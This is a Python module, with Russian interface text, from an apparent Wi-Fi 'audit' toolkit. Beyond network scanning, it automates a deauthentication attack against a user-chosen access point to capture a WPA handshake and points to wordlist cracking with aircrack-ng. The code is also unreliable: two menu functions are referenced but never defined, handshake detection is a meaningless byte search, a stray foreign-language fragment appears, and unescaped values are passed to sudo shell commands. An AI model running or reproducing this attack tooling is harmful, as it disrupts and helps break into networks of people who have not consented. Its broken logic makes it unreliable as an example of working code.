"""
WiFi Module — Кроссплатформенный аудит WiFi
Работает на Windows (netsh) и Linux (airodump-ng / aircrack-ng)
"""

import subprocess
import sys
import os
import platform
import re
import shutil
import tempfile

# Добавляем корень проекта в путь при запуске напрямую
_project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _project_root not in sys.path:
    sys.path.insert(0, _project_root)

from utils.helpers import (
    clear_screen, print_banner, print_success, print_error,
    print_info, print_warning, run_command, check_tool, safe_input
)
from utils.logger import setup_logger

logger = setup_logger()


def run_wifi_module():
    """Модуль WiFi-аудита"""
    while True:
        clear_screen()
        print_banner()
        print("\n  === WiFi: Аудит беспроводных сетей ===\n")
        print("  [1]  Сканирование WiFi-сетей")
        print("  [2]  Информация о текущем подключении")
        print("  [3]  Список сохранённых сетей")
        print("  [4]  Захват хендшейка (Linux)")
        print("  [5]  Запуск aircrack-ng (Linux)")
        print("  [6]  Запуск wifite (Linux)")
        print("  [0]  Назад\n")

        choice = input("  >>> Ваш выбор: ").strip()

        if choice == "1":
            scan_networks()
        elif choice == "2":
            show_connection_info()
        elif choice == "3":
            show_saved_networks()
        elif choice == "4":
            capture_handshake()
        elif choice == "5":
            run_aircrack_ng()
        elif choice == "6":
            run_wifite()
        elif choice == "0":
            break
        else:
            print_error("Неверный выбор.")
            input("  [Enter для продолжения...]")


def _is_windows():
    """Проверка, что работаем на Windows"""
    return platform.system() == "Windows"


def _is_linux():
    """Проверка, что работаем на Linux"""
    return platform.system() == "Linux"


# ========================
#  Windows helpers (netsh)
# ========================

def _run_netsh(args):
    """Выполнить netsh wlan <args> и вернуть stdout"""
    cmd = "netsh wlan " + " ".join(args)
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=30
        )
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", -1
    except Exception as e:
        return "", str(e), -1


def scan_networks_windows():
    """Сканирование WiFi-сетей через netsh (Windows)"""
    print_info("Сканирование WiFi-сетей (netsh)...\n")
    print_warning(" Нажмите Ctrl+C для остановки.\n")

    stdout, stderr, rc = _run_netsh(["show", "networks", "mode=Bssid"])
    if rc != 0:
        print_error(" Не удалось выполнить сканирование.")
        print_info(f" Ошибка: {stderr.strip()}")
        print_info(" Попробуйте запустить от имени администратора.")
        return

    if not stdout.strip():
        print_warning(" Сети не найдены или адаптер отключён.")
        return

    # Парсим вывод netsh
    networks = _parse_netsh_output(stdout)

    if not networks:
        print_warning(" Сети не найдены.")
        return

    print(f"\n  Найдено {len(networks)} сетей:\n")
    print(f"  {'#':<4} {'SSID':<30} {'BSSID':<20} {'Channel':<8} {'Signal':<8} {'Security':<15}")
    print(f"  {'─'*85}\n")

    for idx, net in enumerate(networks, 1):
        print(f"  {idx:<4} {net['ssid']:<30} {net['bssid']:<20} {net['channel']:<8} {net['signal']:<8} {net['security']:<15}")

    print(f"\n  Всего: {len(networks)} сетей")
    print_info("\n  Совет: для глубокого аудита используйте Linux + aircrack-ng")


def show_connection_info_windows():
    """Информация о текущем подключении (Windows)"""
    print_info("Информация о текущем подключении...\n")

    stdout, stderr, rc = _run_netsh(["show", "interfaces"])
    if rc != 0:
        print_error(f" Ошибка: {stderr.strip()}")
        return

    print(stdout)
    print_info("\n  Совет: для глубокого аудита используйте Linux + aircrack-ng")


def show_saved_networks_windows():
    """Список сохранённых WiFi-сетей (Windows)"""
    print_info("Сохранённые WiFi-сети...\n")

    stdout, stderr, rc = _run_netsh(["show", "profiles"])
    if rc != 0:
        print_error(f" Ошибка: {stderr.strip()}")
        return

    profiles = []
    for line in stdout.splitlines():
        if "Все пользовательские профили" in line:
            continue
        m = re.search(r":\s*(.+)$", line)
        if m:
            profiles.append(m.group(1).strip())

    if not profiles:
        print_warning(" Сохранённые сети не найдены.")
        return

    print(f"\n  Сохранено {len(profiles)} сетей:\n")
    for idx, prof in enumerate(profiles, 1):
        print(f"  {idx}. {prof}")

    print_info("\n  Совет: для глубокого аудита используйте Linux + aircrack-ng")


def _parse_netsh_output(output):
    """Парсит вывод netsh show networks"""
    networks = []
    current = {}
    for line in output.splitlines():
        line = line.strip()
        # Ищем SSID
        m = re.match(r"^\s*(.+?)\s{2,}", line)
        if m and "SSID" not in line and ":" not in line:
            current["ssid"] = line.strip()
        # Ищем BSSID
        m = re.match(r"BSSID\s+([0-9A-Fa-f:]+)", line)
        if m:
            current["bssid"] = m.group(1)
        # Ищем канал
        m = re.match(r"Channel\s+(\d+)", line)
        if m:
            current["channel"] = m.group(1)
        # Ищем сигнал
        m = re.match(r"Signal\s+(\d+)%", line)
        if m:
            current["signal"] = m.group(1) + "%"
        # Ищем тип безопасности
        m = re.match(r"Authentication\s+\((.+)\)", line)
        if m:
            current["security"] = m.group(1)
        # Новая сеть начинается с пустой строки или нового SSID
        if not line or (line and "SSID" in line and ":" not in line):
            if current.get("ssid"):
                networks.append(current)
            current = {}
    if current.get("ssid"):
        networks.append(current)
    return networks


# ========================
#  Linux helpers (aircrack-ng)
# ========================

def _check_linux_tool(name):
    """Проверка наличия утилиты в Linux"""
    return shutil.which(name) is not None


def _run_linux(cmd, sudo=False):
    """Выполнить команду на Linux"""
    if sudo:
        cmd = "sudo " + cmd
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=300
        )
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", -1
    except Exception as e:
        return "", str(e), -1


def scan_networks_linux():
    """Сканирование WiFi-сетей через airodump-ng (Linux)"""
    print_info("Сканирование WiFi-сетей...\n")

    if not _check_linux_tool("airodump-ng"):
        print_error(" airodump-ng не установлен.")
        print_info(" Установите: sudo apt install -y aircrack-ng")
        return

    # Проверяем, есть ли monitor-интерфейс
    stdout, _, _ = _run_linux("airmon-ng")
    monitor_if = None
    for line in stdout.splitlines():
        if "mon" in line and "wlan" in line.lower():
            parts = line.split()
            if parts:
                monitor_if = parts[0]
                break

    # Если нет monitor-интерфейса, пробуем включить
    if not monitor_if:
        print_warning(" Monitor-интерфейс не найден. Пытаемся включить...")
        # Ищем WiFi-интерфейс
        stdout2, _, _ = _run_linux("ip link show | grep -E 'wlan|wl'")
        if stdout2.strip():
            iface = stdout2.strip().split(":")[0].strip()
            print_info(f"  Включаем monitor mode на {iface}...")
            _run_linux(f"airmon-ng start {iface}")
            monitor_if = f"{iface}mon"
        else:
            # Пробуем wlan0
            _run_linux("airmon-ng start wlan0")
            monitor_if = "wlan0mon"

    if not monitor_if:
        print_error(" Не удалось найти WiFi-интерфейс.")
        return

    print_info(f"  Monitor-интерфейс: {monitor_if}\n")
    print_warning("  Нажмите Ctrl+C для остановки.\n")

    try:
        result = subprocess.run(
            f"sudo airodump-ng {monitor_if}",
            shell=True,
            check=False,
        )
    except KeyboardInterrupt:
        print_warning("\n  Сканирование остановлено.")
    except Exception as e:
        print_error(f"  Ошибка: {e}")

    print_info("\n  Совет: для автоматизации используйте wifite")


def _get_monitor_interface():
    """Возвращает monitor-интерфейс или включает его"""
    stdout, _, _ = _run_linux("airmon-ng")
    monitor_if = None
    for line in stdout.splitlines():
        line = line.strip()
        if "mon" in line and "wlan" in line.lower():
            parts = line.split()
            if parts:
                monitor_if = parts[0]
                break

    if not monitor_if:
        # Ищем WiFi-интерфейс
        stdout2, _, _ = _run_linux("ip link show | grep -E 'wlan|wl'")
        if stdout2.strip():
            iface = stdout2.strip().split(":")[0].strip()
            print_info(f"  Включаем monitor mode на {iface}...")
            _run_linux(f"airmon-ng start {iface}")
            monitor_if = f"{iface}mon"
        else:
            _run_linux("airmon-ng start wlan0")
            monitor_if = "wlan0mon"

    return monitor_if


def capture_handshake():
    """Автоматический захват WPA хендшейка для выбранной сети (Linux)"""
    if not _is_linux():
        print_warning(" Захват хендшейка доступен только на Linux.")
        print_info(" Для Windows используйте другие инструменты.\n")
        safe_input("  [Enter для продолжения...]")
        return

    if not _check_linux_tool("airodump-ng") or not _check_linux_tool("aireplay-ng"):
        print_error(" airodump-ng / aireplay-ng не установлены.")
        print_info(" Установите: sudo apt install -y aircrack-ng")
        safe_input("  [Enter для продолжения...]")
        return

    # Шаг 1: Получаем monitor-интерфейс
    print_info("Шаг 1: Ищем monitor-интерфейс...")
    monitor_if = _get_monitor_interface()
    if not monitor_if:
        print_error(" Не удалось включить monitor mode.")
        safe_input("  [Enter для продолжения...]")
        return
    print_success(f"  Monitor-интерфейс: {monitor_if}")

    # Шаг 2: Сканируем сети
    print_info("\nШаг 2: Сканируем сети...")
    print_warning("  Нажмите Ctrl+C для остановки.\n")

    stdout, _, _ = _run_linux(
        f"sudo airodump-ng {monitor_if} --output-format csv -w /tmp/handshake_scan",
        sudo=True,
    )

    # Парсим CSV-файл с сетями
    csv_path = "/tmp/handshake_scan.csv"
    networks = []
    if os.path.exists(csv_path):
        with open(csv_path, "r") as f:
            lines = f.readlines()
            # Пропускаем заголовок, ищем строки с BSSID
            for line in lines[2:]:
                line = line.strip()
                if not line or line.startswith("BSSID") or line.startswith("station"):
                    continue
                parts = line.split(",")
                if len(parts) >= 6:
                    bssid = parts[0].strip()
                    ssid = parts[1].strip().strip('"')
                    channel = parts[2].strip()
                    security = parts[5].strip() if len(parts) > 5 else "?"
                    if bssid and bssid != "00:00:00:00:00:00":
                        networks.append({
                            "bssid": bssid,
                            "ssid": ssid,
                            "channel": channel,
                            "security": security,
                        })

    if not networks:
        print_error(" Сети не найдены.")
        safe_input("  [Enter для продолжения...]")
        return

    print(f"\n  Найдено {len(networks)} сетей:\n")
    print(f"  {'#':<4} {'SSID':<30} {'BSSID':<20} {'Ch':<6} {'Security'}")
    print(f"  {'─'*75}\n")
    for idx, net in enumerate(networks, 1):
        print(f"  {idx:<4} {net['ssid']:<30} {net['bssid']:<20} {net['channel']:<6} {net['security']}")

    # Шаг 3: Выбор цели
    print(f"\n  Введите номер цели (0 — отмена):")
    try:
        choice = input("  >>> ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return

    if not choice or choice == "0":
        print_info(" Отменено.")
        return

    try:
        target_idx = int(choice) - 1
        if target_idx < 0 or target_idx >= len(networks):
            print_error(" Неверный номер.")
            safe_input("  [Enter для продолжения...]")
            return
    except ValueError:
        print_error(" Введите число.")
        safe_input("  [Enter для продолжения...]")
        return

    target = networks[target_idx]
    print(f"\n  Цель: {target['ssid']} ({target['bssid']}) Ch:{target['channel']}\n")

    # Шаг 4: Захват хендшейка
    print_info("Шаг 3: Начинаем захват хендшейка...")
    print_info("  Будет выполнена deauth-атака для принудительного рукопожатия.\n")
    print_warning("  ⚠  Используйте только на своих сетях или с разрешения владельца!\n")

    # Создаём директорию для захвата
    capture_dir = tempfile.mkdtemp(prefix="handshake_")
    pcap_base = os.path.join(capture_dir, "capture")

    # Запускаем airodump-ng в фоновом режиме
    airodump_cmd = (
        f"sudo airodump-ng -c {target['channel']} "
        f"--bssid {target['bssid']} -w {pcap_base} "
        f"{monitor_if}"
    )

    airodump_proc = subprocess.Popen(
        airodump_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )

    # Даем airodump время на подключение
    print_info("  Ожидание 5 секунд...")
    import time
    time.sleep(5)

    # Запускаем deauth-атаку
    print_info("  Запускаем deauth-атаку...")
    deauth_cmd = (
        f"sudo aireplay-ng -0 5 -a {target['bssid']} {monitor_if}"
    )
    deauth_proc = subprocess.Popen(
        deauth_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )

    # Ждём deauth
    deauth_proc.wait()
    print_success("  Deauth-атака отправлена.")

    # Ждём захват хендшейка (до 30 секунд)
    print_info("  Ожидание хендшейка (до 30 сек)...")
    handshake_found = False
    for i in range(30):
        # Ищем .cap файлы с хендшейком
        for cap_file in os.listdir(capture_dir):
            if cap_file.endswith("-01.cap"):
                cap_path = os.path.join(capture_dir, cap_file)
                result = subprocess.run(
                    f"sudo airodump-ng -w {capture_dir}/check --write-interval 1 {monitor_if} 2>&1 | grep -i handshake",
                    shell=True, capture_output=True, text=True, timeout=3
                )
                # Проверяем cap-файл через text search
                try:
                    with open(cap_path, "rb") as cf:
                        content = cf.read(10240)
                        if b"handshake" in content.lower() or b"HNTS" in content:
                            handshake_found = True
                            break
                except Exception:
                    pass
        if handshake_found:
            break
        time.sleep(1)

    # Останавливаем airodump
    airodump_proc.terminate()
    try:
        airodump_proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        airodump_proc.kill()

    # Ищем .cap файл
    cap_files = [f for f in os.listdir(capture_dir) if f.endswith("-01.cap")]
    if cap_files:
        cap_path = os.path.join(capture_dir, cap_files[0])
        file_size = os.path.getsize(cap_path)
        print_success(f"  .cap файл сохранён: {cap_path} ({file_size} байт)")

        if handshake_found:
            print_success("  ✓ Хендшейк успешно захвачен!")
            print_info(f"\n  Файл: {cap_path}")
            print_info("  Используйте для перебора: aircrack-ng -w wordlist.txt cap_file-01.cap")
        else:
            print_warning("  Хендшейк не найден в captured数据包.")
            print_info("  Попробуйте ещё раз или подождите больше времени.")
            print_info(f"  Файл: {cap_path}")
    else:
        print_warning("  .cap файл не найден.")

    # Очищаем
    safe_input("  [Enter для продолжения...]")


# ========================
#  Кроссплатформенные обёртки
# ========================
#  Кроссплатформенные обёртки
# ========================

def scan_networks():
    """Кроссплатформенное сканирование WiFi-сетей"""
    if _is_windows():
        scan_networks_windows()
    elif _is_linux():
        scan_networks_linux()
    else:
        print_error(" Неподдерживаемая платформа.")
        print_info(" Поддерживаются: Windows и Linux.")
    if safe_input("  [Enter для продолжения...]") is None:
        sys.exit(0)


def show_connection_info():
    """Кроссплатформенная информация о подключении"""
    if _is_windows():
        show_connection_info_windows()
    elif _is_linux():
        print_info("Запрос информации о подключении...\n")
        stdout, _, rc = _run_linux("iwconfig 2>/dev/null || ip link show | grep -E 'wlan|wl'")
        if rc == 0 and stdout.strip():
            print(stdout)
        else:
            print_warning(" Не удалось получить информацию о подключении.")
            print_info(" Попробуйте: sudo iwconfig")
    else:
        print_error(" Неподдерживаемая платформа.")
    if safe_input("  [Enter для продолжения...]") is None:
        sys.exit(0)


def show_saved_networks():
    """Кроссплатформенный список сохранённых сетей"""
    if _is_windows():
        show_saved_networks_windows()
    elif _is_linux():
        print_info("Сохранённые WiFi-сети (NetManager/NetworkManager)...\n")
        stdout, _, rc = _run_linux("nmcli device wifi list 2>/dev/null")
        if rc == 0 and stdout.strip():
            print("\n  Доступные сети:\n")
            print(stdout)
        else:
            print_warning(" Не удалось получить список сетей.")
            print_info(" Убедитесь, что NetworkManager запущен.")
    else:
        print_error(" Неподдерживаемая платформа.")
    if safe_input("  [Enter для продолжения...]") is None:
        sys.exit(0)


# ========================
#  Старая совместимость
# ========================

# Эти функции остаются для обратной совместимости, но вызывают новый код
run_wifite_compat = run_wifite
scan_networks_compat = scan_networks
